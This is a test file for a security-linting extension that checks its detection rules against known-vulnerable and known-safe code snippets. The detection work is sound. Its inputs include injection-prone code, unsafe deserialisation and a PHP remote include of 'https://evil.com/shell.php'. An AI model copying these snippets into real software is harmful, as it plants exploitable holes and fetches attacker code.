/**
 * Rule pattern tests — verify each rule fires on known-bad lines and stays
 * silent on known-good lines.  No VS Code API required; runs under plain Node.
 *
 * Run:  node out/test/rules.test.js
 */

import * as assert from "assert";
import { ALL_RULES } from "../rules";
import { SecurityRule } from "../types";

// ── tiny harness ─────────────────────────────────────────────────────────────

let passed = 0;
let failed = 0;
const failures: string[] = [];

function ruleFor(id: string): SecurityRule {
	const r = ALL_RULES.find((x) => x.id === id);
	if (!r) {
		throw new Error(`Rule not found: ${id}`);
	}
	return r;
}

function matchesAny(rule: SecurityRule, line: string): boolean {
	for (const pat of rule.patterns) {
		pat.lastIndex = 0;
		if (pat.test(line)) {
			return true;
		}
	}
	return false;
}

function shouldMatch(ruleId: string, line: string): void {
	const rule = ruleFor(ruleId);
	if (matchesAny(rule, line)) {
		passed++;
	} else {
		failed++;
		failures.push(
			`FAIL [${ruleId}] Expected match but got none:\n  ${line}`,
		);
	}
}

function shouldNotMatch(ruleId: string, line: string): void {
	const rule = ruleFor(ruleId);
	if (!matchesAny(rule, line)) {
		passed++;
	} else {
		failed++;
		failures.push(
			`FAIL [${ruleId}] Expected NO match but got one:\n  ${line}`,
		);
	}
}

// ── priorContextSafe helpers ──────────────────────────────────────────────────
// Replicates the suppression logic in diagnosticProvider.ts so we can test it
// without needing the VS Code API.

function contextSuppressed(
	rule: SecurityRule,
	lines: string[],
	targetIdx: number,
): boolean {
	if (!rule.priorContextSafe) {
		return false;
	}
	const { lines: ctxLines, safePatterns } = rule.priorContextSafe;
	const lineText = lines[targetIdx];
	const keyRef = /\$_(?:GET|POST|REQUEST)\s*\[[^\]]+\]/i.exec(lineText)?.[0];
	if (!keyRef) {
		return false;
	}
	const start = Math.max(0, targetIdx - ctxLines);
	for (let ci = start; ci < targetIdx; ci++) {
		const ctxLine = lines[ci];
		if (ctxLine.includes(keyRef)) {
			for (const sp of safePatterns) {
				sp.lastIndex = 0;
				if (sp.test(ctxLine)) {
					return true;
				}
			}
		}
	}
	return false;
}

function shouldSuppressContext(
	ruleId: string,
	lines: string[],
	targetIdx: number,
): void {
	const rule = ruleFor(ruleId);
	if (!matchesAny(rule, lines[targetIdx])) {
		passed++; // pattern doesn't fire at all — suppression is moot
		return;
	}
	if (contextSuppressed(rule, lines, targetIdx)) {
		passed++;
	} else {
		failed++;
		failures.push(
			`FAIL [${ruleId}] Expected context suppression but got none:\n  ${lines[targetIdx]}`,
		);
	}
}

function shouldNotSuppressContext(
	ruleId: string,
	lines: string[],
	targetIdx: number,
): void {
	const rule = ruleFor(ruleId);
	if (!matchesAny(rule, lines[targetIdx])) {
		passed++; // pattern doesn't fire at all — no suppression needed
		return;
	}
	if (!contextSuppressed(rule, lines, targetIdx)) {
		passed++;
	} else {
		failed++;
		failures.push(
			`FAIL [${ruleId}] Expected NO context suppression but finding was suppressed:\n  ${lines[targetIdx]}`,
		);
	}
}

// ── A01: Directory Traversal ──────────────────────────────────────────────────

shouldMatch("A01-DIRECTORY-TRAVERSAL", "fs.readFile(req.query.filepath)");
shouldMatch("A01-DIRECTORY-TRAVERSAL", "fopen($_GET['file'], 'r')");
shouldMatch("A01-DIRECTORY-TRAVERSAL", "path.join(__dirname, req.params.id)");
shouldNotMatch("A01-DIRECTORY-TRAVERSAL", "fs.readFile('./static/logo.png')");
shouldNotMatch("A01-DIRECTORY-TRAVERSAL", "path.join(__dirname, 'public')");

// ── A02: Weak Hash ────────────────────────────────────────────────────────────

shouldMatch("A02-WEAK-HASH-MD5", "crypto.createHash('md5')");
shouldMatch("A02-WEAK-HASH-MD5", "hashlib.md5(data)");
shouldNotMatch("A02-WEAK-HASH-MD5", "crypto.createHash('sha256')");

shouldMatch("A02-WEAK-HASH-SHA1", "crypto.createHash('sha1')");
shouldMatch("A02-WEAK-HASH-SHA1", "hashlib.sha1(data)");
shouldNotMatch("A02-WEAK-HASH-SHA1", "crypto.createHash('sha256')");

// ── A02: Hardcoded Secret ─────────────────────────────────────────────────────

shouldMatch("A02-HARDCODED-SECRET", "password = 'hunter2'");
shouldMatch("A02-HARDCODED-SECRET", "api_key = 'sk-abc1234567'");
shouldMatch("A02-HARDCODED-SECRET", "const secret = 'mysupersecret'");
shouldNotMatch("A02-HARDCODED-SECRET", "password = process.env.DB_PASS");
shouldNotMatch("A02-HARDCODED-SECRET", "const key = ''"); // too short (<4 chars)

// ── A02: Insecure Random ──────────────────────────────────────────────────────

shouldMatch("A02-INSECURE-RANDOM", "const token = Math.random()");
shouldNotMatch("A02-INSECURE-RANDOM", "const buf = crypto.randomBytes(32)");

// ── A03: SQL Injection ────────────────────────────────────────────────────────

shouldMatch(
	"A03-SQL-INJECTION",
	"db.query('SELECT * FROM users WHERE id = ' + req.params.id)",
);
shouldMatch(
	"A03-SQL-INJECTION",
	"connection.execute(`SELECT * FROM users WHERE id = ${req.body.id}`)",
);
shouldMatch(
	"A03-SQL-INJECTION",
	"\"SELECT * FROM users WHERE name = '%s'\" % (name,)",
);
shouldNotMatch(
	"A03-SQL-INJECTION",
	"db.query('SELECT * FROM users WHERE id = ?', [id])",
);

// ── A03: Command Injection ────────────────────────────────────────────────────

shouldMatch("A03-COMMAND-INJECTION", "exec('ls ' + req.query.dir)");
shouldMatch(
	"A03-COMMAND-INJECTION",
	"child_process.exec(`ping ${req.body.host}`)",
);
shouldNotMatch("A03-COMMAND-INJECTION", "execFile('ls', ['-la'])");

// ── A03: XSS innerHTML ────────────────────────────────────────────────────────

shouldMatch("A03-XSS-INNERHTML", "el.innerHTML = userData");
shouldMatch("A03-XSS-INNERHTML", "document.write(content)");
shouldNotMatch("A03-XSS-INNERHTML", "el.textContent = userData");
// Static literal string (starts with quote then <) should not fire
shouldNotMatch("A03-XSS-INNERHTML", 'div.innerHTML ="<b>bold</b>"');

// ── A03: Eval ─────────────────────────────────────────────────────────────────

shouldMatch("A03-EVAL-INJECTION", "eval(userInput)");
shouldMatch("A03-EVAL-INJECTION", "new Function(code)()");
shouldNotMatch("A03-EVAL-INJECTION", "JSON.parse(userInput)");

// ── A04: CSRF (fixed regex) ───────────────────────────────────────────────────

shouldMatch(
	"A04-MISSING-CSRF",
	"app.post('/login', (req, res) => { res.json({}) })",
);
// PHP: fires on handler entry points only (isset gate or REQUEST_METHOD check)
shouldMatch("A04-MISSING-CSRF", "if (isset($_POST['action']))");
shouldMatch("A04-MISSING-CSRF", "$_SERVER['REQUEST_METHOD'] === 'POST'");
// A line that contains a CSRF/token/nonce reference should NOT fire
shouldNotMatch("A04-MISSING-CSRF", "if (isset($_POST['csrf_token']))");
shouldNotMatch("A04-MISSING-CSRF", "verifyToken($_POST['token']);");
shouldNotMatch("A04-MISSING-CSRF", "if (isset($_POST['nonce']))");

// ── A04: Mass Assignment ──────────────────────────────────────────────────────

shouldMatch("A04-MASS-ASSIGNMENT", "User.create(req.body)");
shouldMatch("A04-MASS-ASSIGNMENT", "model.update({ ...req.body })");
shouldNotMatch("A04-MASS-ASSIGNMENT", "User.create({ name: req.body.name })");

// ── A05: CORS wildcard ────────────────────────────────────────────────────────

shouldMatch("A05-CORS-WILDCARD", "origin: '*'");
shouldMatch("A05-CORS-WILDCARD", "cors({ origin: '*' })");
shouldNotMatch("A05-CORS-WILDCARD", "origin: 'https://myapp.com'");

// ── A05: Debug enabled ────────────────────────────────────────────────────────

shouldMatch("A05-DEBUG-ENABLED", "app.run(debug=True)");
shouldMatch("A05-DEBUG-ENABLED", "DEBUG = True");
shouldMatch("A05-DEBUG-ENABLED", "app.listen(3000, { debug: true })");
shouldNotMatch("A05-DEBUG-ENABLED", "DEBUG = False");

// ── A06: Known vulnerable package (updated - no lodash/jsonwebtoken) ──────────

shouldMatch(
	"A06-KNOWN-VULNERABLE-PACKAGE",
	"const s = require('node-serialize')",
);
shouldMatch("A06-KNOWN-VULNERABLE-PACKAGE", "const m = require('minimist')");
shouldNotMatch("A06-KNOWN-VULNERABLE-PACKAGE", "const _ = require('lodash')");
shouldNotMatch(
	"A06-KNOWN-VULNERABLE-PACKAGE",
	"const jwt = require('jsonwebtoken')",
);
shouldNotMatch(
	"A06-KNOWN-VULNERABLE-PACKAGE",
	"const request = require('request')",
);

// ── A07: Insecure Cookie (A07-INSECURE-COOKIE no longer fires on res.cookie) ──

shouldMatch("A07-INSECURE-COOKIE", "setcookie('session', $id)");
shouldMatch("A07-INSECURE-COOKIE", "response.set_cookie('session', value)");
// Express res.cookie is now handled exclusively by JS-INSECURE-COOKIE-OPTIONS
shouldNotMatch(
	"A07-INSECURE-COOKIE",
	"res.cookie('session', token, { secure: true })",
);

// ── JS-INSECURE-COOKIE-OPTIONS ────────────────────────────────────────────────

shouldMatch(
	"JS-INSECURE-COOKIE-OPTIONS",
	"res.cookie('session', token, { httpOnly: true })",
); // missing secure
shouldNotMatch(
	"JS-INSECURE-COOKIE-OPTIONS",
	"res.cookie('session', token, { secure: true, httpOnly: true })",
);

// ── A07: JWT none algorithm ───────────────────────────────────────────────────

shouldMatch("A07-JWT-NONE-ALG", "algorithms: 'none'");
shouldNotMatch("A07-JWT-NONE-ALG", "algorithms: 'RS256'");

// ── A08: Unsafe pickle ────────────────────────────────────────────────────────

shouldMatch("A08-DESERIALIZE-PICKLE", "pickle.loads(data)");
shouldMatch("A08-DESERIALIZE-PICKLE", "yaml.load(stream)");
shouldNotMatch("A08-DESERIALIZE-PICKLE", "yaml.safe_load(stream)");

// ── A10: SSRF ─────────────────────────────────────────────────────────────────

const ssrfRule = ruleFor("A10-SSRF");
// Quick sanity: rule exists and has patterns
assert.ok(
	ssrfRule.patterns.length > 0,
	"A10-SSRF should have at least one pattern",
);

// ── CSP rules ─────────────────────────────────────────────────────────────────

shouldMatch(
	"CSP-UNSAFE-INLINE",
	"Content-Security-Policy: script-src 'unsafe-inline'",
);
shouldNotMatch(
	"CSP-UNSAFE-INLINE",
	"Content-Security-Policy: script-src 'nonce-abc123'",
);

shouldMatch("CSP-WILDCARD-SRC", "Content-Security-Policy: script-src *");
shouldNotMatch(
	"CSP-WILDCARD-SRC",
	"Content-Security-Policy: default-src 'self'",
);

// ── JS-specific rules ─────────────────────────────────────────────────────────

shouldMatch("JS-SENSITIVE-STORAGE", "localStorage.setItem('token', jwt)");
shouldMatch("JS-SENSITIVE-STORAGE", "sessionStorage.setItem('password', pw)");
shouldNotMatch("JS-SENSITIVE-STORAGE", "localStorage.setItem('theme', 'dark')");

shouldMatch("JS-JWT-NO-VERIFY", "const payload = jwt.decode(token)");
shouldNotMatch("JS-JWT-NO-VERIFY", "const payload = jwt.verify(token, secret)");

// JS-NO-RATE-LIMIT is now info severity — just confirm it still matches
shouldMatch("JS-NO-RATE-LIMIT", "app.post('/login', loginHandler)");
shouldNotMatch("JS-NO-RATE-LIMIT", "app.get('/profile', getProfile)");

// JS-POSTMESSAGE-NO-ORIGIN is now info severity — confirm still matches
shouldMatch(
	"JS-POSTMESSAGE-NO-ORIGIN",
	"window.addEventListener('message', handler)",
);
shouldNotMatch(
	"JS-POSTMESSAGE-NO-ORIGIN",
	"window.addEventListener('click', handler)",
);

// ── PHP rules ─────────────────────────────────────────────────────────────────

shouldMatch(
	"PHP-SQL-INJECTION",
	"mysqli_query($conn, \"SELECT * FROM users WHERE id='\".$_GET['id'].\"'\")",
);
shouldMatch("PHP-ECHO-XSS", "echo $_GET['name'];");
shouldNotMatch(
	"PHP-ECHO-XSS",
	"echo htmlspecialchars($_GET['name'], ENT_QUOTES);",
);

// ── PHP-SQL-VARIABLE ─────────────────────────────────────────────────────────

shouldMatch(
	"PHP-SQL-VARIABLE",
	'mysqli_query($conn, "SELECT * FROM users WHERE id = " . $userId)',
);
shouldMatch(
	"PHP-SQL-VARIABLE",
	'"SELECT * FROM orders WHERE id=\'" . $orderId . "\'"',
);
// Superglobals are handled by PHP-SQL-INJECTION, not PHP-SQL-VARIABLE
shouldNotMatch(
	"PHP-SQL-VARIABLE",
	"mysqli_query($conn, \"SELECT * FROM users WHERE id = \" . $_GET['id'])",
);

// ── General rules ─────────────────────────────────────────────────────────────

shouldMatch("GEN-HTTP-URL", "fetch('http://api.example.com/data')");
shouldNotMatch("GEN-HTTP-URL", "fetch('https://api.example.com/data')");

// GEN-SENSITIVE-COMMENT requires a value after = or : (e.g. "password = hunter2")
shouldMatch("GEN-SENSITIVE-COMMENT", "// password = hunter2");
shouldMatch("GEN-SENSITIVE-COMMENT", "// api_key: sk-abc1234");
// Plain mentions of "password" in comments without a value do NOT trigger
shouldNotMatch(
	"GEN-SENSITIVE-COMMENT",
	"// TODO: remove password before deploy",
);
shouldNotMatch("GEN-SENSITIVE-COMMENT", "// make sure to hash passwords");

// ── CISA rules ────────────────────────────────────────────────────────────────

// CISA-PHP-UNSERIALIZE
shouldMatch("CISA-PHP-UNSERIALIZE", "unserialize($_POST['data'])");
shouldMatch("CISA-PHP-UNSERIALIZE", "unserialize($payload)");
shouldNotMatch("CISA-PHP-UNSERIALIZE", "json_decode($_POST['data'])");

// CISA-PY-PICKLE-UNSAFE
shouldMatch("CISA-PY-PICKLE-UNSAFE", "pickle.loads(data)");
shouldMatch("CISA-PY-PICKLE-UNSAFE", "pickle.load(f)");
shouldNotMatch("CISA-PY-PICKLE-UNSAFE", "json.loads(data)");

// CISA-PY-YAML-UNSAFE-LOAD
shouldMatch("CISA-PY-YAML-UNSAFE-LOAD", "yaml.load(stream)");
shouldNotMatch("CISA-PY-YAML-UNSAFE-LOAD", "yaml.safe_load(stream)");

// CISA-CRYPTO-ECB-MODE
shouldMatch("CISA-CRYPTO-ECB-MODE", "createCipheriv('aes-128-ecb', key, iv)");
shouldMatch("CISA-CRYPTO-ECB-MODE", "const mode = MODE_ECB");
shouldNotMatch(
	"CISA-CRYPTO-ECB-MODE",
	"createCipheriv('aes-256-gcm', key, iv)",
);

// CISA-CRYPTO-HARDCODED-IV
shouldMatch("CISA-CRYPTO-HARDCODED-IV", "const iv = '0102030405060708'");
shouldMatch("CISA-CRYPTO-HARDCODED-IV", "iv = b'0000000000000000'");
shouldNotMatch("CISA-CRYPTO-HARDCODED-IV", "const iv = crypto.randomBytes(16)");

// CISA-JWT-ALG-NONE
shouldMatch("CISA-JWT-ALG-NONE", "algorithms: ['none']");
shouldMatch("CISA-JWT-ALG-NONE", "algorithm: 'none'");
shouldNotMatch("CISA-JWT-ALG-NONE", "algorithms: ['HS256']");

// CISA-JWT-NO-ALG-RESTRICT
shouldMatch(
	"CISA-JWT-NO-ALG-RESTRICT",
	"jwt.verify(token, secret, { expiresIn: '1h' })",
);
shouldNotMatch(
	"CISA-JWT-NO-ALG-RESTRICT",
	"jwt.verify(token, secret, { algorithms: ['HS256'] })",
);

// CISA-PHP-TYPE-JUGGLING
shouldMatch("CISA-PHP-TYPE-JUGGLING", "if ($password == $hash)");
shouldMatch("CISA-PHP-TYPE-JUGGLING", "if ($token == $_POST['t'])");
shouldNotMatch("CISA-PHP-TYPE-JUGGLING", "if ($password === $hash)");

// CISA-PHP-DYNAMIC-CLASS
shouldMatch("CISA-PHP-DYNAMIC-CLASS", "new $$className()");
shouldMatch("CISA-PHP-DYNAMIC-CLASS", "new $_GET['type']()");
shouldNotMatch("CISA-PHP-DYNAMIC-CLASS", "new MyClass()");

// CISA-PHP-REMOTE-INCLUDE
shouldMatch("CISA-PHP-REMOTE-INCLUDE", "include('https://evil.com/shell.php')");
shouldMatch("CISA-PHP-REMOTE-INCLUDE", "require($_GET['page'])");
shouldNotMatch(
	"CISA-PHP-REMOTE-INCLUDE",
	"include __DIR__ . '/pages/home.php'",
);

// CISA-PY-SUBPROCESS-SHELL
shouldMatch("CISA-PY-SUBPROCESS-SHELL", "subprocess.run(cmd, shell=True)");
shouldMatch("CISA-PY-SUBPROCESS-SHELL", "os.system(f'ping {host}')");
shouldNotMatch("CISA-PY-SUBPROCESS-SHELL", "subprocess.run(['ls', '-la'])");

// CISA-PY-SSL-NO-VERIFY
shouldMatch("CISA-PY-SSL-NO-VERIFY", "requests.get(url, verify=False)");
shouldMatch("CISA-PY-SSL-NO-VERIFY", "ssl.CERT_NONE");
shouldNotMatch("CISA-PY-SSL-NO-VERIFY", "requests.get(url, verify=True)");

// CISA-PY-JINJA2-AUTOESCAPE-OFF
shouldMatch(
	"CISA-PY-JINJA2-AUTOESCAPE-OFF",
	"jinja2.Environment(loader=loader)",
);
shouldMatch("CISA-PY-JINJA2-AUTOESCAPE-OFF", "autoescape=False");
shouldNotMatch(
	"CISA-PY-JINJA2-AUTOESCAPE-OFF",
	"jinja2.Environment(autoescape=True, loader=loader)",
);

// CISA-PY-XML-UNSAFE
shouldMatch("CISA-PY-XML-UNSAFE", "ET.fromstring(data)");
shouldMatch("CISA-PY-XML-UNSAFE", "minidom.parseString(xml_str)");
shouldNotMatch("CISA-PY-XML-UNSAFE", "defusedxml.fromstring(data)");

// ── Severity regression check — info rules should not be critical ─────────────

const rateLimitRule = ruleFor("JS-NO-RATE-LIMIT");
assert.strictEqual(
	rateLimitRule.severity,
	"info",
	"JS-NO-RATE-LIMIT should be info severity after false-positive fix",
);

const postMsgRule = ruleFor("JS-POSTMESSAGE-NO-ORIGIN");
assert.strictEqual(
	postMsgRule.severity,
	"info",
	"JS-POSTMESSAGE-NO-ORIGIN should be info severity after false-positive fix",
);

// ── priorContextSafe context-aware suppression ────────────────────────────────

// Same key validated with a real validator in prior context → suppress
shouldSuppressContext(
	"PHP-IV-RAW-POST",
	["if (is_numeric($_POST['id'])) {", "  $user_id = $_POST['id'];"],
	1,
);

// isset only (existence check, not a real validator) → do NOT suppress
shouldNotSuppressContext(
	"PHP-IV-RAW-POST",
	["if (isset($_POST['id'])) {", "  $user_id = $_POST['id'];"],
	1,
);

// Different key validated → do NOT suppress the un-validated key
shouldNotSuppressContext(
	"PHP-IV-RAW-POST",
	["if (is_numeric($_POST['email'])) {", "  $user_id = $_POST['id'];"],
	1,
);

// filter_var in prior context for same key (GET) → suppress
shouldSuppressContext(
	"PHP-IV-RAW-GET",
	[
		"if (filter_var($_GET['page'], FILTER_VALIDATE_INT)) {",
		"  $page = $_GET['page'];",
	],
	1,
);

// ── New rules: PHP ────────────────────────────────────────────────────────────

// PHP-CURL-SSRF
shouldMatch("PHP-CURL-SSRF", "curl_setopt($ch, CURLOPT_URL, $_GET['url']);");
shouldMatch(
	"PHP-CURL-SSRF",
	"curl_setopt($ch, CURLOPT_URL, $_POST['target']);",
);
shouldNotMatch(
	"PHP-CURL-SSRF",
	"curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);",
);
shouldNotMatch(
	"PHP-CURL-SSRF",
	"curl_setopt($ch, CURLOPT_URL, 'https://api.example.com');",
);

// PHP-PHPINFO
shouldMatch("PHP-PHPINFO", "phpinfo();");
shouldMatch("PHP-PHPINFO", "  phpinfo()  ");
shouldMatch("PHP-PHPINFO", "// phpinfo();");
shouldNotMatch("PHP-PHPINFO", "$info = 'see phpinfo docs';");

// PHP-DEBUG-OUTPUT
shouldMatch("PHP-DEBUG-OUTPUT", "var_dump($_POST['user']);");
shouldMatch("PHP-DEBUG-OUTPUT", "print_r($_GET);");
shouldMatch("PHP-DEBUG-OUTPUT", "var_export($_REQUEST['data'], true);");
shouldNotMatch("PHP-DEBUG-OUTPUT", "var_dump($sanitizedData);");
shouldNotMatch("PHP-DEBUG-OUTPUT", "print_r($results);");

// PHP-SESSION-FIXATION
shouldMatch("PHP-SESSION-FIXATION", "session_id($_GET['sid']);");
shouldMatch("PHP-SESSION-FIXATION", "session_id($_COOKIE['session']);");
shouldNotMatch("PHP-SESSION-FIXATION", "session_id();");
shouldNotMatch("PHP-SESSION-FIXATION", "$sid = session_id();");

// ── New rules: Python ─────────────────────────────────────────────────────────

// IV-PY-SQL-FSTRING
shouldMatch(
	"IV-PY-SQL-FSTRING",
	'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")',
);
shouldMatch(
	"IV-PY-SQL-FSTRING",
	'db.execute(f"DELETE FROM sessions WHERE token = {tok}")',
);
shouldMatch(
	"IV-PY-SQL-FSTRING",
	'"SELECT * FROM orders WHERE id = {}".format(order_id)',
);
shouldNotMatch(
	"IV-PY-SQL-FSTRING",
	'cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))',
);
shouldNotMatch(
	"IV-PY-SQL-FSTRING",
	'results = db.query("SELECT id FROM logs")',
);

// IV-PY-DJANGO-CSRF-EXEMPT
shouldMatch("IV-PY-DJANGO-CSRF-EXEMPT", "@csrf_exempt");
shouldMatch("IV-PY-DJANGO-CSRF-EXEMPT", "  @csrf_exempt  ");
shouldMatch("IV-PY-DJANGO-CSRF-EXEMPT", "# @csrf_exempt");
shouldNotMatch("IV-PY-DJANGO-CSRF-EXEMPT", "csrf_protect");

// IV-PY-DJANGO-ALLOWED-HOSTS
shouldMatch("IV-PY-DJANGO-ALLOWED-HOSTS", "ALLOWED_HOSTS = ['*']");
shouldMatch("IV-PY-DJANGO-ALLOWED-HOSTS", 'ALLOWED_HOSTS = ["*"]');
shouldNotMatch(
	"IV-PY-DJANGO-ALLOWED-HOSTS",
	"ALLOWED_HOSTS = ['example.com', 'www.example.com']",
);
shouldNotMatch("IV-PY-DJANGO-ALLOWED-HOSTS", "ALLOWED_HOSTS = []");

// ── New rules: General ────────────────────────────────────────────────────────

// GEN-HARDCODED-CLOUD-KEY
shouldMatch("GEN-HARDCODED-CLOUD-KEY", "AKIAIOSFODNN7EXAMPLE");
shouldMatch("GEN-HARDCODED-CLOUD-KEY", "ASIAIOSFODNN7EXAMPLE");
shouldMatch("GEN-HARDCODED-CLOUD-KEY", "-----BEGIN RSA PRIVATE KEY-----");
shouldMatch("GEN-HARDCODED-CLOUD-KEY", "-----BEGIN OPENSSH PRIVATE KEY-----");
shouldMatch(
	"GEN-HARDCODED-CLOUD-KEY",
	"AIzaSyDaGmWKa4JsXZ-HjGw7ISLn_3namBGewQE",
);
shouldNotMatch("GEN-HARDCODED-CLOUD-KEY", "process.env.AWS_ACCESS_KEY_ID");
shouldNotMatch("GEN-HARDCODED-CLOUD-KEY", "-----BEGIN CERTIFICATE-----");

// ALL_RULES sanity: no duplicate IDs
const ids = ALL_RULES.map((r) => r.id);
const dupes = ids.filter((id, i) => ids.indexOf(id) !== i);
assert.deepStrictEqual(
	dupes,
	[],
	`Duplicate rule IDs found: ${dupes.join(", ")}`,
);
if (dupes.length === 0) {
	passed++;
}

// ── Summary ───────────────────────────────────────────────────────────────────

console.log(`\n${"─".repeat(60)}`);
if (failures.length > 0) {
	console.log(failures.join("\n\n"));
	console.log(`${"─".repeat(60)}`);
}
console.log(
	`Rules test: ${passed} passed, ${failed} failed (${ALL_RULES.length} rules total)`,
);

if (failed > 0) {
	process.exit(1);
}
